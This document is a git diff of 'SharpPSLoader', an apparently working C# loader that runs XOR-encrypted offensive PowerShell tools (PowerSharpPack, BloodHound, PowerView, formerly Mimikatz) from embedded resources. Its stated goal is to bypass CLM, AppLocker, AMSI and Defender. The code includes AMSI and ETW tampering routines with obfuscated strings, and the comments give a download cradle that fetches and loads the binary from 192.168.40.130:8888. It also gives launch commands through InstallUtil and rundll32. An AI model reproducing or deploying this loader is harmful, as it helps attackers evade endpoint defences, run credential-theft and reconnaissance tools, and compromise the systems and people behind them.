@@ -2,85 +2,60 @@
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
-using System.Threading.Tasks;
-using System.Configuration.Install;
 using System.Management.Automation;
 using System.Management.Automation.Runspaces;
 using System.Collections;
 using System.Runtime.InteropServices;
-using System.IO;
 using System.Reflection;
 
 
 /*
  * Add reference to c:\windows\assembly\gac_msil\system.management.automation\1.0.0.0\<~>\system.management.automation.dll  and configuration.install 
- * 
- * "Any CPU" --> installutils works, running assembly through main() fail. 
- * "x64" --> installutils works, running assembly through main() works.
- * 
- * C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U <test.exe>
- * 
- *  * Goal: 
- *  - Create a powershell loader from .NET which can bypass CLM, Applocker, AMSI, and Defender 
- *      - CLM = Through custom powershell runspace (powerpick technique)
- *      - Applocker = Through lolbas such as InstallUtil and rundll32
- *      - AMSI = Through .NET (.net amsi is a thing though) 
- *      - Defender = Bypassing defender ain't that hard 
  *      
  *      
  * Adding Resources 
  *  - Project > Properties > Add Resources > Access Modifier = Public 
  *  - And simply access it like... var thingy = Properties.Resources.<resource-name>
  *      - Returns "type" by default. ex) .txt file ==> string, byte file ==> byte[] 
+ *  - Thought about adding powershell scripts, decided to just yoink powersharppack and call it a day 
+ *  
+ * Usage: 
+ *  - Console
+ *      .\SharpPSLoaderLibrary.exe 1 powersharppack -seatbelt -command "-group=user"
+ *      
+ *  - In-memory (Obfuscated, Non-obfuscated)
+ *      $b = (New-Object net.webclient).DownloadData("http://192.168.40.130:8888/SharpPSLoader.exe")
+ *      [System.Reflection.Assembly]::Load($b)
+ *      [SharpPSLoaderLibrary.SharpPSLoaderLibrary]::Main(@("1","Powersharppack -sharpup audit"))
  * 
- * TODO: 
- *  - Finish parsing user arguments (payload type + additional argument) 
- *  - Finish implementing everything to installutils section 
- *  - Embed more powershell scripts
- *  - cleanup the code - it's a mess rn + remove readline()
+ *  - LOLBAS - InstallUtils.exe 
+ *      C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /p="1 PowerSharpPack -seatbelt -Command '-group=user'" /U .\SharpPSLoaderLibrary.exe
+ *      
+ *  - Library - rundll32.exe 
+ *      c:\windows\system32\rundll32.exe SharpPSLoaderLibrary.dll,runLibrary 1 powersharppack -seatbelt -command -group=user 
  *  
- *  
- *  (stretch)
- *  - DInvoke or peb parsing 
- *     
+ *      (64bit) c:\windows\system32\rundll32.exe SharpPSLoaderLibrary.dll,runLibrary 1 powersharppack -seatbelt -command -group=user 
+ *      (32bit) C:\Windows\SysWOW64\rundll32.exe SharpPSLoaderLibrary.dll,runLibrary 1 powersharppack -seatbelt -command -group=user
  * 
  * */
 
-/*
- * 1. parseresources --> <string, byte[]> (currently encrypted) 
- * 2. decryptedPSFromRsrcDict --> string (decrypted) 
- * 3. RunPowershell 
- * */
-
-namespace SharpPSLoader
+namespace SharpPSLoaderLibrary
 {
-    // helper function 
-/*    public static bool ContainsAny(this string haystack, params string[] needles)
-    {
-        foreach (string needle in needles)
-        {
-            if (haystack.Contains(needle))
-                return true;
-        }
-
-        return false;
-    }*/
-
-    public class SharpPSLoader
+    public class SharpPSLoaderLibrary
     {
 
         public Dictionary<string, byte[]> resourceDict = ParseResources();
 
         /// <summary>
-        /// XOR Decrypt powershell byte array payload with key and return raw powershell payload 
+        /// XOR Decrypt powershell byte array payload with key and return raw powershell payload
         /// </summary>
         /// <param name="payload"></param>
-        /// <param name="singleByteKey"></param>
+        /// <param name="singleByteKey">Default xor decrypt key is 0x6f = 111</param>
         /// <returns>resultStr, powershell string</returns>
         public static string DecryptAndStringReturn(byte[] payload, byte singleByteKey = 0x6f)
         {
             byte[] result = new byte[payload.Length];
-            for(int i = 0; i < payload.Length; i++)
+            for (int i = 0; i < payload.Length; i++)
             {
                 result[i] = (byte)(payload[i] ^ singleByteKey);
             }
@@ -105,34 +80,37 @@ namespace SharpPSLoader
             foreach (PropertyInfo property in (typeof(Properties.Resources).GetProperties
                 (BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic)).Skip(2))  // Skip ResourceManager and Culture - hardcoding ftw 
             {
-                resourceDict[property.Name] = (byte[])(property.GetValue(null, null));
+                resourceDict[property.Name.ToLower()] = (byte[])(property.GetValue(null, null));
             }
             return resourceDict;
         }
 
-        // public byte[] ByteArrayFromRsrcDict(dictionary<string,byte[]> resourceDict) { ~switch, return byte[] } 
-        // make resourceDict into a member variable? not sure. 
         /// <summary>
         /// Decrypt powershell payload from the resources dictioanry and return the raw powershell payload 
         /// </summary>
         /// <param name="resourceDict"></param>
         /// <param name="payload"></param>
         /// <returns>decPowershell</returns>
-        public string DecryptedPSFromRsrcDict(Dictionary<string,byte[]> resourceDict, string payload)
+        public string DecryptedPSFromRsrcDict(Dictionary<string, byte[]> resourceDict, string payload)
         {
             // 1. Return encrypted powershell payload byte array 
-            byte[] encPayload = Array.Empty<byte>();
+            byte[] encPayload = new byte[] { };
 
 #if DEBUG
             Console.WriteLine("[+] payload = {0}", payload);
 #endif
-            switch (payload.Trim())
+
+            // 1 = PowerSharpPack 2. Bloodhound 3. Powerview 
+            switch (payload.Trim().ToLower())
             {
                 case "1":
-                    encPayload = resourceDict.Where(a => a.Key.Contains("mika")).Select(a => a.Value).First();
+                    encPayload = resourceDict.Where(a => a.Key.Contains("arppack")).Select(a => a.Value).First();
                     break;
                 case "2":
                     encPayload = resourceDict.Where(a => a.Key.Contains("oodHo")).Select(a => a.Value).First();
+                    break;
+                case "3":
+                    encPayload = resourceDict.Where(a => a.Key.Contains("wervi")).Select(a => a.Value).First();
                     break;
                 default:
                     break;
@@ -153,7 +131,7 @@ namespace SharpPSLoader
                 //Console.WriteLine(line);
                 if (line.ToLower().Contains("function"))
                 {
-                    functionName = line.Split(' ')[1].Trim().Replace("{","");
+                    functionName = line.Split(' ')[1].Trim().Replace("{", "");
                     break;
                 }
             }
@@ -237,8 +215,6 @@ namespace SharpPSLoader
             }
         }
 
-
-        // TODO: Create helper function that does basic string replace? 
         public void bypassTW()
         {
             string susLibraryZ = "nZtZdZlZlZ.dZlZlZ";
@@ -290,30 +266,11 @@ namespace SharpPSLoader
             Console.WriteLine("[+] User argument = {0}", argument);
 #endif
             string cmd = payload;
-
-            // Parse for "function" and retrieve the function name here and add to cmd 
-            // Why parse functionName? Because simply typing "Invoke-Mimikatz -DumpCred" will trigger amsi. 
-            string functionName = ParseFunctionName(cmd);
-
-            // If script has a single invoke-<XYZ> functionName, add that at the end of the script 
-            var requireFunctionName = new[] { "mikat", "loodhou" };
-            bool boolFunctionName = requireFunctionName.Any(s => functionName.ToLower().Contains(s));
-
-            if (!string.IsNullOrEmpty(argument) && boolFunctionName)
-            {
-                Console.WriteLine(functionName);
-                cmd += ";";
-                cmd += functionName;
-                cmd += " ";
-                cmd += argument;
-            }
-            else
-            {
-                cmd += "; ";
-                cmd += argument;
-            }
+            cmd += ";";
+            cmd += argument;
 
 #if DEBUG
+            // Uncomment to see raw powershell payload string in console 
             //Console.WriteLine(cmd);
 #endif
 
@@ -326,17 +283,17 @@ namespace SharpPSLoader
             var results = ps.Invoke();
 
             // Result is 0, powershell errored out. 
-            if(results.Count == 0)
+            if (results.Count == 0)
             {
                 Console.WriteLine("[-] Powershell returned error");
                 return;
             }
 
             // Result is not 0, at least something returned. Write all output and yeet out. 
-            foreach(var obj in results)
+            foreach (var obj in results)
             {
                 if (obj != null)
-                { 
+                {
                     Console.WriteLine(obj.BaseObject.ToString());
                 }
             }
@@ -345,21 +302,40 @@ namespace SharpPSLoader
         }
 
         // Empty constructor for now 
-        public SharpPSLoader()
+        public SharpPSLoaderLibrary()
         {
-            
+
         }
-       
 
-        public static void Main(string[] args)
+        // -------------------------------------------------------------------------------------------------
+        // Exported execute function for rundll32.exe
+        // - https://blog.xpnsec.com/rundll32-your-dotnet/
+        // - https://3xpl01tc0d3r.blogspot.com/2019/11/managed-dll-exports-and-run-via-rundll32.html
+        // -------------------------------------------------------------------------------------------------
+        [DllExport("runLibrary")]
+        public static void runLibrary()
         {
-            Console.WriteLine("[+] Starting from main! ");
 
+            // Attach console & Parse commandline through getCommandLineA() pinvoke here 
+            AttachConsole(0x0ffffffff);
+            // Get all commandline argument (ex. rundll32.exe,Execute 1 PowerSharpPack -seatbelt -command '-group=user') 
+            string cmdVal = GetCommandLineA();
+            string fName = "runLibrary";
 
-            SharpPSLoader psLoader = new SharpPSLoader();
+            // Get starting index of the function name ("Execute")
+            int funcIndex = cmdVal.IndexOf(fName);
+
+            // Actual argument index = function name index + function name length 
+            int argStartIndex = funcIndex + fName.Length;
+
+            // Final arguments are every string after argStartIndex 
+            string finalArgs = cmdVal.Substring(argStartIndex).TrimStart();
+            string[] args = finalArgs.Split(' ');
+
+            // Execute starts 
+            SharpPSLoaderLibrary psLoader = new SharpPSLoaderLibrary();
             psLoader.bypassSI();
             psLoader.bypassTW();
-            //Console.ReadLine();
 
             // Parse argument 
             string powershellPayload = "";
@@ -369,11 +345,7 @@ namespace SharpPSLoader
             }
 
             string argument = String.Join(" ", args.Skip(1));
-            Console.WriteLine(argument);
             psLoader.RunPowershell(powershellPayload, argument);
-
-            // Remove me later! 
-            Console.ReadLine();
         }
 
 
@@ -394,48 +366,45 @@ namespace SharpPSLoader
         out uint lpflOldProtect);
 
 
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern bool AttachConsole(uint dwProcessId);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern string GetCommandLineA();
     }
 
-    
-    /*
-     * 1. Parse payload type (1~5) 
-     * 2. Retrieve payload from the resources section 
-     * 3. Single XOR decrypt using "111" hardcoded key 
-     * 4. Invoke it
-     * */
+
+
+    // -------------------------------------------------------------------------------------------------
+    // Uninstall function to execute SharpPSLoader through InstallUtil.exe 
+    // -------------------------------------------------------------------------------------------------
+
+    // C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /p="1 PowerSharpPack -seatbelt -Command '-group=user'" /U .\SharpPSLoader.exe
+
     [System.ComponentModel.RunInstaller(true)]
-    public class Sample: System.Configuration.Install.Installer
+    public class Sample : System.Configuration.Install.Installer
     {
-        SharpPSLoader psLoader = new SharpPSLoader();
-
-
-        // Mimikatz doesn't work, but bloodhound does...? 
-        /// <summary>
-        /// 
-        /// </summary>
-        /// <param name="savedState"></param>
         public override void Uninstall(IDictionary savedState)
         {
-            Console.WriteLine("hello, world!");
-            //var psPayload = this.Context.Parameters["p"];
-            //Console.WriteLine(psPayload.ToString());
-            SharpPSLoader psLoader = new SharpPSLoader();
+            SharpPSLoaderLibrary psLoader = new SharpPSLoaderLibrary();
 
             // Are these two needed, when I'm executing through cmd + lolbas? 
             psLoader.bypassSI();
             psLoader.bypassTW();
 
             // Parse argument 
-            var userArg = this.Context.Parameters["p"];
+            var userArg = this.Context.Parameters["p"].ToString();
             string payload = userArg.Split(' ')[0];
             int spaceIndex = userArg.IndexOf(' ');
             string argument = userArg.Substring(spaceIndex, userArg.Length - 1);
+
 
             string powershellPayload = "";
             if (payload != null)
             {
                 powershellPayload = psLoader.DecryptedPSFromRsrcDict(psLoader.resourceDict, payload);
             }
+
 
             psLoader.RunPowershell(powershellPayload, argument);
 
